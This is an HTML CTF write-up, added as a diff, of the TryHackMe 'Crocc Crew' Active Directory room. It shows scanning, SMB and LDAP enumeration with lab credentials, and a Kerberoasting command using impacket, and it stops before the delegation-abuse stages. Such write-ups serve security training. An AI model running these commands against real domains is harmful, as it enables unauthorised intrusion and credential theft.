@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crocc Crew — Hack Back | QA210 Writeup</title>
+    <meta name="description" content="TryHackMe Crocc Crew writeup — Active Directory exploitation via Kerberoasting, constrained delegation abuse (S4U), and full domain compromise — by QA210">
+    <meta name="author" content="QA210">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+    <!-- Prism.js -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg0: #06080c;
+            --bg1: #0b0f17;
+            --bg2: #111827;
+            --bg3: #1a2234;
+            --border: #1e293b;
+            --border-light: #334155;
+            --text0: #f1f5f9;
+            --text1: #e2e8f0;
+            --text2: #94a3b8;
+            --text3: #64748b;
+            --accent: #3b82f6;
+            --accent-dim: rgba(59, 130, 246, 0.15);
+            --accent-glow: rgba(59, 130, 246, 0.3);
+            --green: #22c55e;
+            --green-dim: rgba(34, 197, 94, 0.15);
+            --red: #ef4444;
+            --red-dim: rgba(239, 68, 68, 0.15);
+            --orange: #f97316;
+            --orange-dim: rgba(249, 115, 22, 0.15);
+            --cyan: #06b6d4;
+            --cyan-dim: rgba(6, 182, 212, 0.15);
+            --purple: #a855f7;
+            --purple-dim: rgba(168, 85, 247, 0.15);
+            --font-body: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+            --font-display: 'Space Grotesk', 'Inter', sans-serif;
+            --sidebar-width: 260px;
+            --content-max: 860px;
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html { scroll-behavior: smooth; scrollbar-width: thin; scrollbar-color: var(--border-light) var(--bg1); }
+
+        body {
+            font-family: var(--font-body);
+            background-color: var(--bg0);
+            color: var(--text1);
+            line-height: 1.75;
+            font-size: 16px;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg1); }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text3); }
+
+        /* Three.js Canvas */
+        #three-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; opacity: 0.3; }
+
+        /* Top Navigation Bar */
+        .top-bar {
+            position: sticky; top: 0; z-index: 100;
+            background: rgba(6, 8, 12, 0.85); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+            padding: 0 24px; height: 56px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .top-bar-left { display: flex; align-items: center; gap: 12px; }
+        .top-bar-logo { font-family: var(--font-display); font-weight: 700; font-size: 18px; color: var(--accent); text-decoration: none; letter-spacing: -0.5px; }
+        .top-bar-logo span { color: var(--text0); }
+        .top-bar-sep { color: var(--border-light); font-size: 20px; }
+        .top-bar-title { font-size: 14px; color: var(--text2); font-weight: 500; }
+        .top-bar-right { display: flex; align-items: center; gap: 16px; }
+        .top-bar-link { color: var(--text3); font-size: 13px; text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .top-bar-link:hover { color: var(--accent); }
+
+        /* Breadcrumbs */
+        .breadcrumbs { display: flex; align-items: center; gap: 8px; padding: 16px 0; font-size: 13px; color: var(--text3); }
+        .breadcrumbs a { color: var(--text2); text-decoration: none; transition: color 0.2s; }
+        .breadcrumbs a:hover { color: var(--accent); }
+        .breadcrumbs .sep { font-size: 10px; }
+        .breadcrumbs .current { color: var(--accent); font-weight: 600; }
+
+        /* Main Layout */
+        .layout {
+            position: relative; z-index: 1;
+            display: flex; justify-content: center;
+            max-width: calc(var(--content-max) + var(--sidebar-width) + 80px);
+            margin: 0 auto; padding: 0 24px; gap: 48px;
+        }
+
+        /* Content Area */
+        .content { flex: 1; max-width: var(--content-max); min-width: 0; padding-bottom: 80px; }
+
+        /* Hero Section */
+        .hero { padding: 48px 0 40px; border-bottom: 1px solid var(--border); margin-bottom: 40px; }
+        .hero-badges { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+        .badge { display: inline-flex; align-items: center; gap: 5px; padding: 4px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .badge-category { background: var(--accent-dim); color: var(--accent); border: 1px solid rgba(59, 130, 246, 0.25); }
+        .badge-difficulty { background: rgba(239, 68, 68, 0.12); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.25); }
+        .badge-platform { background: rgba(16, 185, 129, 0.12); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.25); }
+        .badge-ad { background: var(--cyan-dim); color: var(--cyan); border: 1px solid rgba(6, 182, 212, 0.25); }
+
+        .hero h1 { font-family: var(--font-display); font-size: clamp(32px, 5vw, 48px); font-weight: 800; color: var(--text0); line-height: 1.15; margin-bottom: 12px; letter-spacing: -1px; }
+        .hero h1 .accent { color: var(--accent); }
+        .hero-subtitle { font-size: 17px; color: var(--text2); line-height: 1.6; max-width: 640px; }
+
+        .hero-meta { display: flex; flex-wrap: wrap; gap: 24px; margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+        .hero-meta-item { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text3); }
+        .hero-meta-item i { font-size: 15px; color: var(--accent); }
+        .hero-meta-item strong { color: var(--text1); font-weight: 600; }
+
+        /* Section Headers */
+        .section { margin-bottom: 48px; scroll-margin-top: 80px; }
+        .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+        .section-number { display: flex; align-items: center; justify-content: center; width: 32px; height: 32px; border-radius: 8px; background: var(--accent-dim); border: 1px solid rgba(59, 130, 246, 0.25); color: var(--accent); font-family: var(--font-display); font-weight: 700; font-size: 14px; flex-shrink: 0; }
+        .section-header h2 { font-family: var(--font-display); font-size: 22px; font-weight: 700; color: var(--text0); letter-spacing: -0.3px; }
+
+        /* Paragraphs */
+        .section p { margin-bottom: 16px; color: var(--text1); line-height: 1.8; }
+        .section strong { color: var(--text0); font-weight: 600; }
+        .section em { color: var(--accent); font-style: italic; }
+
+        /* Key Hints Box */
+        .key-hints { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 20px 24px; margin: 20px 0; }
+        .key-hints-title { display: flex; align-items: center; gap: 8px; font-weight: 700; color: var(--accent); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; }
+        .key-hints ul { list-style: none; padding: 0; }
+        .key-hints li { position: relative; padding-left: 20px; margin-bottom: 8px; color: var(--text1); font-size: 14px; }
+        .key-hints li::before { content: '\203A'; position: absolute; left: 0; color: var(--accent); font-weight: 700; font-size: 16px; }
+
+        /* Code Blocks */
+        .code-block-wrapper { position: relative; margin: 20px 0; border-radius: 10px; overflow: hidden; border: 1px solid var(--border); }
+        .code-block-header { display: flex; align-items: center; justify-content: space-between; padding: 8px 16px; background: var(--bg3); border-bottom: 1px solid var(--border); }
+        .code-block-lang { font-family: var(--font-mono); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.8px; color: var(--text3); }
+        .code-block-copy { display: flex; align-items: center; gap: 5px; padding: 4px 10px; background: transparent; border: 1px solid var(--border); border-radius: 5px; color: var(--text3); font-family: var(--font-mono); font-size: 11px; cursor: pointer; transition: all 0.2s; }
+        .code-block-copy:hover { background: var(--accent-dim); border-color: var(--accent); color: var(--accent); }
+        .code-block-copy.copied { background: rgba(16, 185, 129, 0.12); border-color: rgba(16, 185, 129, 0.3); color: #34d399; }
+        .code-block-wrapper pre { margin: 0 !important; padding: 16px !important; background: var(--bg1) !important; border-radius: 0 !important; overflow-x: auto; }
+        .code-block-wrapper code { font-family: var(--font-mono) !important; font-size: 13px !important; line-height: 1.7 !important; }
+
+        /* Inline code */
+        :not(pre) > code { font-family: var(--font-mono); font-size: 0.875em; background: var(--bg3); color: var(--accent); padding: 2px 7px; border-radius: 4px; border: 1px solid var(--border); }
+
+        /* Callout Boxes */
+        .callout { display: flex; gap: 14px; padding: 16px 20px; border-radius: 10px; margin: 20px 0; font-size: 14px; line-height: 1.7; }
+        .callout-icon { flex-shrink: 0; font-size: 18px; margin-top: 2px; }
+        .callout-content { flex: 1; }
+        .callout-content strong { display: block; margin-bottom: 4px; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .callout-info { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.2); }
+        .callout-info .callout-icon { color: #60a5fa; }
+        .callout-info .callout-content strong { color: #60a5fa; }
+        .callout-info .callout-content { color: var(--text1); }
+        .callout-warning { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); }
+        .callout-warning .callout-icon { color: #fbbf24; }
+        .callout-warning .callout-content strong { color: #fbbf24; }
+        .callout-warning .callout-content { color: var(--text1); }
+        .callout-danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); }
+        .callout-danger .callout-icon { color: #f87171; }
+        .callout-danger .callout-content strong { color: #f87171; }
+        .callout-danger .callout-content { color: var(--text1); }
+        .callout-success { background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.2); }
+        .callout-success .callout-icon { color: #4ade80; }
+        .callout-success .callout-content strong { color: #4ade80; }
+        .callout-success .callout-content { color: var(--text1); }
+
+        /* Ordered List */
+        .step-list { list-style: none; padding: 0; margin: 16px 0; counter-reset: step-counter; }
+        .step-list li { position: relative; padding-left: 28px; margin-bottom: 10px; color: var(--text1); counter-increment: step-counter; }
+        .step-list li::before { content: counter(step-counter); position: absolute; left: 0; top: 1px; width: 20px; height: 20px; border-radius: 5px; background: var(--accent-dim); border: 1px solid rgba(59, 130, 246, 0.25); color: var(--accent); font-family: var(--font-display); font-weight: 700; font-size: 11px; display: flex; align-items: center; justify-content: center; }
+
+        /* Attack Flow */
+        .attack-flow { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 20px 24px; margin: 20px 0; }
+        .attack-flow-title { display: flex; align-items: center; gap: 8px; font-weight: 700; color: var(--orange); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 16px; }
+        .flow-steps { display: flex; flex-direction: column; gap: 0; }
+        .flow-step { display: flex; align-items: center; gap: 12px; padding: 10px 0; font-size: 14px; color: var(--text1); }
+        .flow-step .flow-num { width: 26px; height: 26px; border-radius: 50%; background: var(--accent-dim); border: 1px solid rgba(59, 130, 246, 0.3); color: var(--accent); font-family: var(--font-display); font-weight: 700; font-size: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .flow-step .flow-arrow { color: var(--text3); font-size: 12px; margin-left: auto; }
+        .flow-connector { width: 1px; height: 12px; background: var(--border-light); margin-left: 13px; }
+
+        /* TOC Sidebar */
+        .toc-sidebar { position: sticky; top: 72px; width: var(--sidebar-width); flex-shrink: 0; max-height: calc(100vh - 88px); overflow-y: auto; padding-bottom: 24px; }
+        .toc-title { font-family: var(--font-display); font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 16px; padding-left: 12px; }
+        .toc-list { list-style: none; padding: 0; }
+        .toc-list li { margin-bottom: 2px; }
+        .toc-link { display: flex; align-items: center; gap: 8px; padding: 6px 12px; font-size: 13px; color: var(--text3); text-decoration: none; border-radius: 6px; transition: all 0.2s; border-left: 2px solid transparent; }
+        .toc-link:hover { color: var(--text1); background: var(--bg2); }
+        .toc-link.active { color: var(--accent); background: var(--accent-dim); border-left-color: var(--accent); }
+        .toc-link .toc-num { font-family: var(--font-display); font-weight: 700; font-size: 11px; color: var(--text3); width: 18px; text-align: center; flex-shrink: 0; }
+        .toc-link.active .toc-num { color: var(--accent); }
+
+        /* Author Footer */
+        .author-footer { margin-top: 48px; padding-top: 24px; border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+        .author-info { display: flex; align-items: center; gap: 12px; }
+        .author-avatar { width: 40px; height: 40px; border-radius: 10px; background: linear-gradient(135deg, var(--accent), #8b5cf6); display: flex; align-items: center; justify-content: center; font-family: var(--font-display); font-weight: 800; font-size: 16px; color: white; }
+        .author-details { display: flex; flex-direction: column; }
+        .author-name { font-weight: 700; font-size: 14px; color: var(--text0); }
+        .author-team { font-size: 12px; color: var(--text3); }
+        .footer-links { display: flex; gap: 12px; }
+        .footer-link { color: var(--text3); font-size: 16px; transition: color 0.2s; }
+        .footer-link:hover { color: var(--accent); }
+
+        /* Flag Display */
+        .flag-display { background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(139, 92, 246, 0.1)); border: 1px solid rgba(59, 130, 246, 0.25); border-radius: 10px; padding: 20px 24px; margin: 20px 0; text-align: center; }
+        .flag-label { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 8px; }
+        .flag-value { font-family: var(--font-mono); font-size: 22px; font-weight: 700; color: var(--accent); letter-spacing: 1px; }
+
+        /* Key Takeaways */
+        .takeaways { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 24px; margin: 24px 0; }
+        .takeaways-title { font-family: var(--font-display); font-weight: 700; font-size: 16px; color: var(--text0); margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .takeaways-title i { color: var(--accent); }
+        .takeaways-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
+        .takeaway-item { display: flex; gap: 10px; padding: 12px 14px; background: var(--bg1); border: 1px solid var(--border); border-radius: 8px; font-size: 13px; line-height: 1.6; }
+        .takeaway-item .takeaway-label { font-weight: 700; color: var(--accent); white-space: nowrap; }
+        .takeaway-item .takeaway-desc { color: var(--text2); }
+
+        /* Mobile Responsive */
+        @media (max-width: 1100px) { .toc-sidebar { display: none; } .layout { max-width: var(--content-max); } }
+        @media (max-width: 640px) {
+            body { font-size: 15px; }
+            .hero h1 { font-size: 28px; }
+            .section-header h2 { font-size: 19px; }
+            .layout { padding: 0 16px; }
+            .top-bar { padding: 0 16px; }
+            .takeaways-grid { grid-template-columns: 1fr; }
+        }
+
+        /* Fade-in animation */
+        .fade-in { opacity: 0; transform: translateY(16px); transition: opacity 0.5s ease, transform 0.5s ease; }
+        .fade-in.visible { opacity: 1; transform: translateY(0); }
+    </style>
+</head>
+<body>
+    <!-- Three.js Background Canvas -->
+    <canvas id="three-bg"></canvas>
+
+    <!-- Top Navigation Bar -->
+    <nav class="top-bar">
+        <div class="top-bar-left">
+            <a href="/" class="top-bar-logo">QA<span>210</span></a>
+            <span class="top-bar-sep">|</span>
+            <span class="top-bar-title">CTF Writeups</span>
+        </div>
+        <div class="top-bar-right">
+            <a href="/" class="top-bar-link"><i class="bi bi-arrow-left"></i> Home</a>
+            <a href="https://github.com/Yuri08-QA210" target="_blank" class="top-bar-link"><i class="bi bi-github"></i> GitHub</a>
+        </div>
+    </nav>
+
+    <!-- Main Layout -->
+    <div class="layout">
+        <!-- Content -->
+        <main class="content">
+            <!-- Breadcrumbs -->
+            <nav class="breadcrumbs">
+                <a href="/">Home</a>
+                <span class="sep"><i class="bi bi-chevron-right"></i></span>
+                <a href="/">TryHackMe</a>
+                <span class="sep"><i class="bi bi-chevron-right"></i></span>
+                <span class="current">Crocc Crew</span>
+            </nav>
+
+            <!-- Hero Section -->
+            <header class="hero fade-in">
+                <div class="hero-badges">
+                    <span class="badge badge-category"><i class="bi bi-bug"></i> Active Directory</span>
+                    <span class="badge badge-difficulty"><i class="bi bi-fire"></i> Hard</span>
+                    <span class="badge badge-platform"><i class="bi bi-cloud"></i> TryHackMe</span>
+                    <span class="badge badge-ad"><i class="bi bi-diagram-3-fill"></i> Domain Controller</span>
+                </div>
+                <h1>Crocc Crew — <span class="accent">Hack Back</span></h1>
+                <p class="hero-subtitle">
+                    The Crocc Crew has already compromised a Cooctus Corp Domain Controller. Our mission: reverse-engineer their attack path by enumerating the compromised DC, cracking Kerberos service tickets, abusing constrained delegation with protocol transition, and achieving full domain takeover.
+                </p>
+                <div class="hero-meta">
+                    <div class="hero-meta-item">
+                        <i class="bi bi-calendar3"></i>
+                        <span><strong>TryHackMe</strong> Room</span>
+                    </div>
+                    <div class="hero-meta-item">
+                        <i class="bi bi-shield-lock"></i>
+                        <span>8 Stages</span>
+                    </div>
+                    <div class="hero-meta-item">
+                        <i class="bi bi-clock-history"></i>
+                        <span>Est. 3-5 hours</span>
+                    </div>
+                    <div class="hero-meta-item">
+                        <i class="bi bi-tools"></i>
+                        <span>Impacket, Evil-WinRM, John</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Attack Flow Overview -->
+            <section id="overview" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">0</div>
+                    <h2>Attack Flow Overview</h2>
+                </div>
+                <p>
+                    This room simulates a scenario where an attacker group called "Crocc Crew" has already placed a backdoor on a Cooctus Corp Domain Controller. Starting from a segmented network position with only the DC visible, we must trace the attackers' footsteps, discover their credentials, and ultimately compromise the domain to find all the flags they left behind. The challenge teaches a complete Active Directory attack chain from enumeration through Kerberoasting to constrained delegation abuse and full domain compromise.
+                </p>
+
+                <div class="attack-flow">
+                    <div class="attack-flow-title"><i class="bi bi-lightning-charge"></i> Kill Chain</div>
+                    <div class="flow-steps">
+                        <div class="flow-step">
+                            <span class="flow-num">1</span>
+                            <span>Network Enumeration (RustScan + Nmap)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">2</span>
+                            <span>Web Enumeration (robots.txt, db-config.bak)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">3</span>
+                            <span>SMB Access as Visitor (user.txt)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">4</span>
+                            <span>LDAP Enumeration + Domain Dump</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">5</span>
+                            <span>Kerberoasting (GetUserSPNs + John)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">6</span>
+                            <span>Constrained Delegation Abuse (S4U2Self + S4U2Proxy)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">7</span>
+                            <span>Secrets Dump (NTDS.DIT + SAM)</span>
+                        </div>
+                        <div class="flow-connector"></div>
+                        <div class="flow-step">
+                            <span class="flow-num">8</span>
+                            <span>Domain Admin via Evil-WinRM (root.txt)</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="key-hints">
+                    <div class="key-hints-title"><i class="bi bi-lightbulb"></i> Key Observations</div>
+                    <ul>
+                        <li>The target is a Windows Domain Controller in the <code>COOCTUS.CORP</code> domain</li>
+                        <li>Credentials <code>Visitor:GuestLogin!</code> grant limited SMB and LDAP access</li>
+                        <li>The <code>password-reset</code> service account has constrained delegation with protocol transition</li>
+                        <li>Constrained delegation targets the non-standard SPN <code>oakley/DC.COOCTUS.CORP</code></li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Stage 1: Reconnaissance -->
+            <section id="recon" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">1</div>
+                    <h2>Network Reconnaissance</h2>
+                </div>
+                <p>
+                    Starting with a full port scan using RustScan piped into Nmap for service detection and script scanning. The target at <code>10.10.175.192</code> reveals a classic Windows Domain Controller fingerprint with DNS, Kerberos, LDAP, SMB, and RPC services all exposed.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">rustscan -a 10.10.175.192 --ulimit 5500 -b 65535 -- -A -Pn</code></pre>
+                </div>
+
+                <p>
+                    The scan reveals <strong>17 open ports</strong> confirming this is a Domain Controller for the <code>COOCTUS.CORP</code> domain. Key services identified include DNS (53), IIS HTTP (80), Kerberos (88), MSRPC (135), NetBIOS (139), LDAP (389/3268), SMB (445), and WinRM (5985 implied). The RDP NTLM info leak confirms the hostname is <code>DC</code> in the <code>COOCTUS</code> domain with Windows Server 2019 (Build 17763).
+                </p>
+
+                <div class="callout callout-info">
+                    <div class="callout-icon"><i class="bi bi-info-circle"></i></div>
+                    <div class="callout-content">
+                        <strong>DC Fingerprint</strong>
+                        The <code>rdp-ntlm-info</code> NSE script leaks the NetBIOS name (<code>DC</code>), DNS name (<code>DC.COOCTUS.CORP</code>), and OS build (10.0.17763 = Server 2019) without authentication. Always run this script against RDP ports.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 2: Web Enumeration -->
+            <section id="web-enum" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">2</div>
+                    <h2>Web Enumeration</h2>
+                </div>
+                <p>
+                    The IIS web server on port 80 hosts a page with a terminal emulator featuring the Crocc Crew branding. The crucial discovery comes from checking <code>robots.txt</code>, which reveals two hidden paths that the attackers left behind.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">text</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-plain">User-Agent: *
+Disallow:
+/robots.txt
+/db-config.bak
+/backdoor.php</code></pre>
+                </div>
+
+                <p>
+                    The <code>/db-config.bak</code> file contains a PHP database configuration backup with hardcoded credentials. This is a critical find that reveals database connection details the Crocc Crew likely used during their initial compromise.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">php</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-php">&lt;?php
+$servername = "db.cooctus.corp";
+$username = "C00ctusAdm1n";
+$password = "B4dt0th3b0n3";
+
+$conn = new mysqli($servername, $username, $password);
+// Check connection
+if ($conn-&gt;connect_error) {
+    die("Connection Failed: " . $conn-&gt;connect_error);
+}
+echo "Connected Successfully";
+?&gt;</code></pre>
+                </div>
+
+                <p>
+                    The main page also contains a JavaScript terminal emulator with the Crocc Crew greeting <code>"CroccCrew >:)"</code>, confirming this is their backdoor. The <code>/backdoor.php</code> endpoint likely serves as their command interface, though direct access doesn't reveal much without the proper authentication or parameters.
+                </p>
+
+                <div class="callout callout-warning">
+                    <div class="callout-icon"><i class="bi bi-exclamation-triangle"></i></div>
+                    <div class="callout-content">
+                        <strong>Credential Note</strong>
+                        The credentials <code>C00ctusAdm1n:B4dt0th3b0n3</code> are for the database server, not directly usable for AD authentication. However, the password pattern suggests reuse may be possible across the environment.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 3: SMB Enumeration -->
+            <section id="smb-enum" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">3</div>
+                    <h2>SMB Enumeration — Visitor Access</h2>
+                </div>
+                <p>
+                    Anonymous RPC access is denied (<code>NT_STATUS_ACCESS_DENIED</code>), but we can enumerate privilege information. The real breakthrough comes from SMB access using the <code>Visitor</code> account. Testing various common guest passwords eventually yields access with <code>Visitor:GuestLogin!</code>.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">smbclient -L //10.10.175.192 -U "Visitor"</code></pre>
+                </div>
+
+                <p>
+                    The share listing reveals several interesting shares including <code>Home</code>, <code>ADMIN$</code>, <code>C$</code>, <code>NETLOGON</code>, and <code>SYSVOL</code>. Connecting to the <code>Home</code> share immediately yields our first flag.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">smbclient //10.10.175.192/Home -U "Visitor"
+# ls
+#   user.txt    A    17
+# more user.txt
+# userflag</code></pre>
+                </div>
+
+                <div class="flag-display">
+                    <div class="flag-label">User Flag</div>
+                    <div class="flag-value">userflag</div>
+                </div>
+
+                <p>
+                    Exploring the <code>SYSVOL</code> share as the Visitor user reveals the standard AD Group Policy structure with <code>Policies</code> and <code>scripts</code> directories. While the scripts folder is empty, this confirms standard AD domain configuration with potential GPO attack vectors for later escalation.
+                </p>
+            </section>
+
+            <!-- Stage 4: LDAP Enumeration -->
+            <section id="ldap-enum" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">4</div>
+                    <h2>LDAP Enumeration & Domain Dump</h2>
+                </div>
+                <p>
+                    Anonymous LDAP queries fail with "Operations error" requiring authentication. However, using the Visitor credentials we can perform a full LDAP bind and enumerate the domain. The first step is identifying the naming contexts, then dumping the full directory.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">ldapsearch -x -s base namingcontexts -H ldap://10.10.175.192
+# namingcontexts: DC=COOCTUS,DC=CORP
+# namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
+# namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,CORP
+
+ldapsearch -x -b "DC=COOCTUS,DC=CORP" \
+  -D "COOCTUS\Visitor" -H ldap://10.10.175.192 \
+  -W > ldap_crocccrew.txt</code></pre>
+                </div>
+
+                <p>
+                    The LDAP dump reveals critical information about the domain. Most importantly, it exposes a service account named <code>password-reset</code> with constrained delegation configured. The <code>msDS-AllowedToDelegateTo</code> attribute shows this account can delegate to multiple SPNs under the <code>oakley</code> service type.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">text</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-plain">sAMAccountName: password-reset
+servicePrincipalName: HTTP/dc.cooctus.corp
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS.CORP
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP
+msDS-AllowedToDelegateTo: oakley/DC
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS
+msDS-AllowedToDelegateTo: oakley/DC/COOCTUS</code></pre>
+                </div>
+
+                <p>
+                    Using <code>ldapdomaindump</code> provides a more structured view of all domain users and groups. The dump reveals approximately 17 domain user accounts including <code>admCroccCrew</code> (a likely attacker-created admin account), standard employee names, and the critical <code>password-reset</code> service account with delegation rights.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">ldapdomaindump 10.10.175.192 -u "COOCTUS\Visitor" -p 'GuestLogin!'
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished</code></pre>
+                </div>
+
+                <div class="callout callout-info">
+                    <div class="callout-icon"><i class="bi bi-info-circle"></i></div>
+                    <div class="callout-content">
+                        <strong>Why Delegation Matters</strong>
+                        Constrained delegation with protocol transition (<code>S4U2Self</code> + <code>S4U2Proxy</code>) allows the <code>password-reset</code> account to impersonate ANY user (including Administrator) to the delegated service. This is one of the most dangerous AD misconfigurations because it enables privilege escalation without needing the target user's password.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Stage 5: Kerberoasting -->
+            <section id="kerberoast" class="section fade-in">
+                <div class="section-header">
+                    <div class="section-number">5</div>
+                    <h2>Kerberoasting — Cracking the Service Ticket</h2>
+                </div>
+                <p>
+                    With the Visitor account's credentials, we can request service tickets for accounts with registered SPNs. The <code>GetUserSPNs</code> tool from Impacket automates this by requesting a TGS ticket for the <code>password-reset</code> account and extracting the encrypted portion for offline cracking.
+                </p>
+
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-block-lang">bash</span>
+                        <button class="code-block-copy" onclick="copyCode(this)"><i class="bi bi-clipboard"></i> Copy</button>
+                    </div>
+                    <pre><code class="language-bash">impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! \
+  -request -dc-ip 10.10.175.192
+
+ServicePrincipalName  Name            MemberOf  Delegation
+--------------------  --------------  --------  -----------
+HTTP/dc.cooctus.corp  password-reset            constrained</code></pre>
+                </div>
+
+                <p>
+                    The output confirms the <code>password-reset</code> account has constrained delegation and provides the TGS hash. We save this hash to a file and crack it using John the Ripper with the rockyou wordlist. The password is recovered almost instantly.
+                </p>
+
